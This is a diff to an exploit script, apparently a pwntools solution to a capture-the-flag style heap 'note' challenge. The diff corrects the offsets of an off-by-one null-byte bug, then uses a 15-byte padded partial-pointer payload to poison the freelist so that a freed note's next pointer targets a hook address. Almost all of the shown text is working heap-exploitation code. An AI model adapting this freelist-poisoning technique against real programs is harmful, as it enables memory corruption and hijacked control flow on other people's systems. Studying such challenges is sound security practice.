@@ -107,23 +107,26 @@ menu()
 create(32, b'A' * 31)   # note 0  (null at note0[31])
 create(32, b'B' * 31)   # note 1
 
-# Step 3: off-by-one → null byte at note0[32] = heap+0x40
+# Step 3: off-by-one via sendline:
+#   before: note0 = 'A'*31 + '\0'         (null at index 31)
+#   append: "X\n\0" via fgets/strcat
+#   after : 'A'*31 + 'X' + '\n' + '\0'    (null now at index 33)
 edit(0, b'X')
-log.info('off-by-one done — null byte at note0[32]')
+log.info('off-by-one done — note0 null terminator moved to index 33')
 
 # Step 4: free note 1 → freelist: [heap+0x50] → NULL
 delete(1)
 log.info('note 1 freed')
 
 # Step 5: poison freelist
-#   current null of note0 is at heap+0x40
+#   current null of note0 is at heap+0x41 (index 33 from note0 start)
 #   note1.data[0]         is at heap+0x50
-#   gap = 0x10 = 16 bytes of padding needed
+#   padding needed: 0x50 - 0x41 = 0x0f (15 bytes)
 #
 #   p64(hook)[:3]  = \x60\x42\x40  (hook = 0x00404260, fits in 3 bytes)
 #   the explicit \x00 in edit_raw stops strcat before '\n' taints byte [3]
 #   result: note1.data[0..3] = \x60\x42\x40\x00 → pointer = 0x00404260 = hook ✓
-payload = b'P' * 16 + p64(hook)[:3]
+payload = b'P' * 15 + p64(hook)[:3]
 edit_raw(0, payload)
 log.info(f'freelist poisoned → note1.next = {hex(hook)}')
 
